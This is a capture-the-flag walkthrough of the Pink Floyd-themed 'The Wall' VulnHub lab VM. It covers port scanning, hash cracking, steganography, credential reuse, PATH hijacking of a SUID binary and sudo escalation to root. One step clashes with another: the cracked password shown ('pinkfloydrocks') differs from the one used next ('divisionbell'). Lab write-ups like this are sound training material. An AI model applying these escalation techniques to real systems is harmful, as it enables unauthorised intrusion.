---
layout: blog_item
title:  "The Wall Boot2Root Walkthrough"
date:   2015-12-02 00:00:10
author: Arr0way
description: 'The Wall Boot2Root - Walkthrough Guide'
categories: [walkthrough]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

In 1965, one of the most influential bands of our times was formed.. Pink
Floyd. This boot2root box has been created to celebrate 50 years of Pink
Floyd's contribution to the music industry, with each challenge giving the
attacker an introduction to each member of the Floyd.

**Author:** [@xerubus](https://twitter.com/xerubus)

**Download:** [VulnHub](https://www.vulnhub.com)

## Enumeration

An initial Nmap scan yielded no results.

WireShark was used to expose an ARP broadcast for <code>TCP: 1337</code>, a netcat listener was setup on port 1337. 

The target machine connected with the following message:

{% highlight bash %}
netcat -n -v -l -p

                      .u!"`
                  .x*"`
              ..+"NP
           .z""   ?
         M#`      9     ,     ,
                  9 M  d! ,8P'
                  R X.:x' R'  ,
                  F F' M  R.d'
                  d P  @  E`  ,
     ss           P  '  P  N.d'
      x         ''        '
      X               x             .
      9     .f       !         .    $b
      4;    $k      /         dH    $f
     'X   ;$$     z  .       MR   :$
       R   M$$,   :  d9b      M'   tM
       M:  #'$L  ;' M `8      X    MR
       `$;t' $F  # X ,oR      t    Q;
        $$@  R$ H :RP' $b     X    @'
        9$E  @Bd' $'   ?X     ;    W
        `M'  `$M d$    `E    ;.o* :R   ..
         `    '  "'     '    @'   '$o*"'

             The Wall by @xerubus
         -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don't be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice

{% endhighlight %}

### Port Scanning

After the machine successfully connected to the netcat listener the following
services were discovered with Nmap. 

{% highlight bash %}

# nmap -sV -p 1-65535 -A -v 192.168.221.129

Starting Nmap 7.00 ( https://nmap.org ) at 2015-11-30 06:29 EST
NSE: Loaded 132 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:29
Completed NSE at 06:29, 0.00s elapsed
Initiating NSE at 06:29
Completed NSE at 06:29, 0.00s elapsed
Initiating ARP Ping Scan at 06:29
Scanning 192.168.221.129 [1 port]
Completed ARP Ping Scan at 06:29, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:29
Completed Parallel DNS resolution of 1 host. at 06:29, 0.00s elapsed
Initiating SYN Stealth Scan at 06:29
Scanning 192.168.221.129 [65535 ports]
Discovered open port 80/tcp on 192.168.221.129
SYN Stealth Scan Timing: About 20.45% done; ETC: 06:31 (0:02:01 remaining)
SYN Stealth Scan Timing: About 48.81% done; ETC: 06:31 (0:01:04 remaining)
Discovered open port 1965/tcp on 192.168.221.129
Completed SYN Stealth Scan at 06:30, 104.59s elapsed (65535 total ports)
Initiating Service scan at 06:30
Scanning 2 services on 192.168.221.129
Completed Service scan at 06:32, 96.15s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.221.129
NSE: Script scanning 192.168.221.129.
Initiating NSE at 06:32
Completed NSE at 06:32, 7.22s elapsed
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Nmap scan report for 192.168.221.129
Host is up, received arp-response (0.00027s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
1965/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.0 (protocol 2.0)
| ssh-hostkey:
|   2048 70:26:15:de:7b:29:9a:56:a3:eb:33:e0:7e:fb:92:d8 (RSA)
|_  256 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a (ECDSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.00%I=7%D=11/30%Time=565C336F%P=x86_64-pc-linux-gnu%r(Get
SF:Request,2D9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-
SF:Length:\x20539\r\nContent-Type:\x20text/html\r\nDate:\x20Sun,\x2029\x20
SF:Nov\x202015\x2022:51:15\x20GMT\r\nLast-Modified:\x20Sat,\x2024\x20Oct\x
SF:202015\x2015:20:23\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\n\r\n<html>\
SF:n<body\x20bgcolor=\"#000000\">\n<center><img\x20src=\"pink_floyd\.jpg\"
SF:</img></center>\n</body>\n</html>\n\n\n<!--If\x20you\x20want\x20to\x20f
SF:ind\x20out\x20what's\x20behind\x20these\x20cold\x20eyes,\x20you'll\x20j
SF:ust\x20have\x20to\x20claw\x20your\x20way\x20through\x20this\x20disguise
SF:\.\x20-\x20Pink\x20Floyd,\x20The\x20Wall\n\nDid\x20you\x20know\?\x20The
SF:\x20Publius\x20Enigma\x20is\x20a\x20mystery\x20surrounding\x20the\x20Di
SF:vision\x20Bell\x20album\.\x20\x20Publius\x20promised\x20an\x20unspecifi
SF:ed\x20reward\x20for\x20solving\x20the\x20\nriddle,\x20and\x20further\x2
SF:0claimed\x20that\x20there\x20was\x20an\x20enigma\x20hidden\x20within\x2
SF:0the\x20artwork\.\n\n737465673d3333313135373330646262623337306663626539
SF:373230666536333265633035-->\n\n")%r(HTTPOptions,218,"HTTP/1\.0\x20405\x
SF:20Method\x20Not\x20Allowed\r\nDate:\x20Sun,\x2029\x20Nov\x202015\x2022:
SF:51:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html\r\nContent-Length:\x20376\r\n\r\n<!DOCTYPE\x
SF:20html>\n<html>\n<head>\n<title>405\x20Method\x20Not\x20Allowed</title>
SF:\n<style\x20type=\"text/css\"><!--\nbody\x20{\x20background-color:\x20w
SF:hite;\x20color:\x20black;\x20font-family:\x20'Comic\x20Sans\x20MS',\x20
SF:'Chalkboard\x20SE',\x20'Comic\x20Neue',\x20sans-serif;\x20}\nhr\x20{\x2
SF:0border:\x200;\x20border-bottom:\x201px\x20dashed;\x20}\n\n--></style>\
SF:n</head>\n<body>\n<h1>405\x20Method\x20Not\x20Allowed</h1>\n<hr>\n<addr
SF:ess>OpenBSD\x20httpd</address>\n</body>\n</html>\n")%r(RTSPRequest,218,
SF:"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Sun,\x2029\x2
SF:0Nov\x202015\x2022:51:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nConne
SF:ction:\x20close\r\nContent-Type:\x20text/html\r\nContent-Length:\x20376
SF:\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n<title>405\x20Method\x20Not
SF:\x20Allowed</title>\n<style\x20type=\"text/css\"><!--\nbody\x20{\x20bac
SF:kground-color:\x20white;\x20color:\x20black;\x20font-family:\x20'Comic\
SF:x20Sans\x20MS',\x20'Chalkboard\x20SE',\x20'Comic\x20Neue',\x20sans-seri
SF:f;\x20}\nhr\x20{\x20border:\x200;\x20border-bottom:\x201px\x20dashed;\x
SF:20}\n\n--></style>\n</head>\n<body>\n<h1>405\x20Method\x20Not\x20Allowe
SF:d</h1>\n<hr>\n<address>OpenBSD\x20httpd</address>\n</body>\n</html>\n");
MAC Address: 00:0C:29:31:3C:84 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4
Uptime guess: 0.000 days (since Mon Nov 30 06:32:25 2015)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Randomized

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.221.129

NSE: Script Post-scanning.
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.78 seconds
           Raw packets sent: 131193 (5.775MB) | Rcvd: 91 (4.108KB)

{% endhighlight %}


### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>OpenBSD httpd</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 1965</code></p></pc>
           </td>
           <td>
              <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 7.0 (protocol 2.0)</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

### HTTP Enumeration

Interrogation of the page source revealed a code comment with an **ASCII** encoded string:

{% highlight html %}
<!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035-->
{% endhighlight %}

Decoding revealed the MD5 hash:<code>steg=33115730dbbb370fcbe9720fe632ec05</code>

## Hash Cracking 

### MD5 Hashcat

The discovered hash was cracked with **Hashcat**:

{% highlight bash %}
hashcat -m 0 -a 0 thewall.txt /usr/share/wordlists/rockyou.txt
{% endhighlight %}

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Hash</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>33115730dbbb370fcbe9720fe632ec05</code></p></pc>
           </td>
           <td>
               <pc><p>pinkfloydrocks</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

## Steghide 

Install steghide on kali: <code>apt-get install -y steghide</code> 

The steghide command <code>steghide extract -sf pink_floyd.jpg</code> was used to extract data from images with hidden
information retained within them (steganography). Entering the previously
cracked password <code>divisionbell</code> disclosed another message containing
a **base64** encoded string and another **md5** hash. 


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>SydBarrett</code></p></pc>
           </td>
           <td>
               <pc><p>divisionbell</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

## SFTP Login

The discovered account credentials above allowed access to an SFTP server on
the target machine. 

{% highlight bash %}

sftp> cd .mail/.stash/
sftp> ls
eclipsed_by_the_moon
sftp> get eclipsed_by_the_moon

{% endhighlight %}

The file <code>eclipsed_by_the_moon</code> was downloaded for further
investigation. 

## Fatcat FAT16 Forensics Tool 

The <code>file</code> command was leveraged  to disclose the following information about the
previously retrived file <code>ecslipsed_by_the_moon</code>. 

{% highlight bash %}
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID
"MSDOS5.0", sectors/cluster 2, reserved sectors 8, root entries 512, Media
descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors
2048, sectors 96256 (volumes > 32 MB) , serial number 0x9e322180, unlabeled,
FAT (16 bit)
{% endhighlight %}

Research discovered **Fatcat** a forensics tool used for
recovering / extracting data from FAT16 images. 

The following command was used to extract a deleted image file from the FAT16
disk image: 

{% highlight bash %}
fatcat ~/Desktop/eclipsed_by_the_moon.lsd -r /rogerwaters.jpg > rogerwaters.jpg
{% endhighlight %}

Viewing the image disclosed the users password:

![Roger Waters - Pink Floyd - The Wall](/img/blog/thewall/rogerwaters.jpg) 

## SSH Shell 

A non privileged SSH shell was established using the previously discovered
credentials.

<div class="note info">
  <h5>Username format</h5>
   <p>The uppercase characters in the username were guessed from the previous username pattern. </p>
</div>

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>RogerWaters</code></p></pc>
           </td>
           <td>
               <pc><p>hello_is_there_anybody_in_there</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

## Local System Enumeration 

### Account: RogerWaters 

Enumeration of the system discovered the SUID binary: <code>/usr/local/bin/brick</code> 

Running the suid binary and answering the question correctly with <code>Nick Mason</code> change the current user to "NickMason".

{% highlight bash %}

$ /usr/local/bin/brick

What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!

Who is the only band member to be featured on every Pink Floyd album? : Nick
Mason
/bin/sh: Cannot determine current working directory
$ id
uid=1001(NickMason) gid=1001(NickMason) groups=1002(RogerWaters)

{% endhighlight %} 

### Account: NickMason 

Local enumeration of <code>nick_mason_profile_pic.jpg</code> discovered the file was an .ogg audio file containing morsecode data.

#### Extracting Morse Code Data 

The ogg file contained morse code data with music playing at the same time over
both stereo channels. 

**Audacity** was used with a low high pass filter to help remove as much of the
lower frequency music as possible, making the higher frequency morse code tones
easier to hear.  

![Audacity Morse Code Low Pass Filter](/img/blog/thewall/audacity.png) 

**Sonic Visualiser** was used in addition to help visualise the morse code dots and
dashes. 

![Sonic Visualiser Morse Code](/img/blog/thewall/morse-code.png)

#### Morse Code Decoded 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Morse Code</th>
      <th>Character</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>.-.</code></p></pc>
           </td>
           <td>
               <pc><p><b>R</b></p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>..</code></p></pc>
           </td>
           <td>
               <pc><p><b>I</b></p></pc>
           </td>
        </tr>

        <tr>
              <td>
                   <pc><p><code>-.-.</code></p></pc>
              </td>
             <td>
             <pc><p><b>C</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>....</code></p></pc>
              </td>
             <td>
             <pc><p><b>H</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>.-</code></p></pc>
              </td>
             <td>
             <pc><p><b>A</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>.-.</code></p></pc>
              </td>
             <td>
             <pc><p><b>R</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>-..</code></p></pc>
              </td>
             <td>
             <pc><p><b>D</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>.--</code></p></pc>
              </td>
             <td>
             <pc><p><b>W</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>.-.</code></p></pc>
              </td>
             <td>
             <pc><p><b>R</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>..</code></p></pc>
              </td>
             <td>
             <pc><p><b>I</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>--.</code></p></pc>
              </td>
             <td>
             <pc><p><b>G</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>....</code></p></pc>
              </td>
             <td>
             <pc><p><b>H</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>-</code></p></pc>
              </td>
             <td>
             <pc><p><b>T</b></p></pc>
             </td>
       </tr>
        <tr>
              <td>
                   <pc><p><code>.---- </code></p></pc>
              </td>
             <td>
             <pc><p><b>1</b></p></pc>
             </td>
       </tr>

      <tr>
              <td>
                   <pc><p><code>----.</code></p></pc>
              </td>
             <td>
             <pc><p><b>9</b></p></pc>
             </td>
       </tr>

      <tr>
              <td>
                   <pc><p><code>....-</code></p></pc>
              </td>
             <td>
             <pc><p><b>4</b></p></pc>
             </td>
       </tr>

      <tr>
              <td>
                   <pc><p><code>...--</code></p></pc>
              </td>
             <td>
             <pc><p><b>3</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>..-.</code></p></pc>
              </td>
             <td>
             <pc><p><b>F</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>.-</code></p></pc>
              </td>
             <td>
             <pc><p><b>A</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>.-.</code></p></pc>
              </td>
             <td>
             <pc><p><b>R</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>..-.</code></p></pc>
              </td>
             <td>
             <pc><p><b>F</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>..</code></p></pc>
              </td>
             <td>
             <pc><p><b>I</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>...</code></p></pc>
              </td>
             <td>
             <pc><p><b>S</b></p></pc>
             </td>
       </tr>

    <tr>
              <td>
                   <pc><p><code>.-</code></p></pc>
              </td>
             <td>
             <pc><p><b>A</b></p></pc>
             </td>
       </tr>

      </tbody>

</table>
</div>

### Discovered Credentials 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>RichardWright</code></p></pc>
           </td>
           <td>
               <pc><p>1943farfisa</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

### Account: RichardWright 

<code>su - RichardWright</code> was possible using the above credentials. 

Local enumeration discovered the SUID binary
<code>/usr/local/bin/shineon</code>, running the binary through
<code>strings</code> discovered it called the program <code>mail</code> without
specifying the absolute path. 

Strings output: 

{% highlight bash %}
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to continue.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c 3 www.google.com
Keep Talking- The Division Bell
mail
{% endhighlight %}

### PATH Manipulation 

The following file was created: 

{% highlight bash %}
/bin/echo "/bin/sh" > /tmp/shell
{% endhighlight %}

Changed directory to <code>/tmp</code> and PATH set to . 

{% highlight bash %}
cd /tmp
export PATH=.
{% endhighlight %} 

Execution of option 4 executed the mail script successfully. 

{% highlight bash %}
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
$ /usr/bin/id
uid=1003(RichardWright) euid=1004(DavidGilmour) gid=1003(RichardWright)
groups=1003(RichardWright)
{% endhighlight %}

### Account: DavidGilmour

With euid set, enumeration of DavidGimours home dir was possible. 

Running strings on <code>david_gilmour_profile.jpg</code> revealed the users
password. 

{% highlight bash %}
$ /usr/bin/strings david_gilmour_profile_pic.jpg

|Mvk
7OnN}
Nn_}
^=>W
{w|6
Om?OoA
who_are_you_and_who_am_i
{% endhighlight %}

<div class="note tip">
  <h5>URL also disclosed via Apache config</h5>
  <p>The web app URL was also disclosed at <code>/etc/httpd.conf.orig</code></p>
</div>

Viewing  <code>anotherbrick.txt</code> revealed the following: 

{% highlight bash %}
# cat /home/DavidGilmour/anotherbrick.txt
# Come on you raver, you seer of visions, come on you painter, you piper, you
prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond

New website for review:
pinkfloyd1965newblogsite50yearscelebration-temp/index.php

# You have to be trusted by the people you lie to. So that when they turn their
backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs
#
{% endhighlight %}

## Web Application Enumeration 

Enumeration of the above web application exposed a code comment riddle: 

{% highlight bash %}
<!--Through the window in the wall, come streaming in on sunlight wings, a
million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming in on
sunlight wings?-->
{% endhighlight %}

The area of the image near the dog revealed some text strings. Using
**Image Magik** the brightness was increased to dislcose the strings
<code>/welcometothemachine</code> and
<code>50696e6b466c6f796435305965617273</code> 

![Image Magik Brightness Increase](/img/blog/thewall/brighter.jpg)

## Root Shell 

Searching for the string <code>welcomethemachine</code> discovered the
following binary <code>/var/www/htdocs/welcometothemachine/PinkFloyd</code>. 

{% highlight bash %}
$ ./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd,
Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now set your controls to the heart of the sun!
$ sudo -l
Password:
Matching Defaults entries for DavidGilmour on thewall:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User DavidGilmour may run the following commands on thewall:
(ALL) SETENV: ALL
(ALL) SETENV: ALL
(ALL) SETENV: ALL
(ALL) SETENV: ALL
$ whoami
DavidGilmour
$ id
uid=1004(DavidGilmour) gid=1004(DavidGilmour)
groups=1004(DavidGilmour), 1(daemon), 67(www),
1005(welcometothemachine)
$ sudo su -
# whoami
root
# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys),
4(tty), 5(operator), 20(staff), 31(guest)
# id
{% endhighlight %}

## Root Flag

![VulnHub TheWall Root Flag](/img/blog/thewall/thewall-root-flag.png)

Thanks for the VM :) 
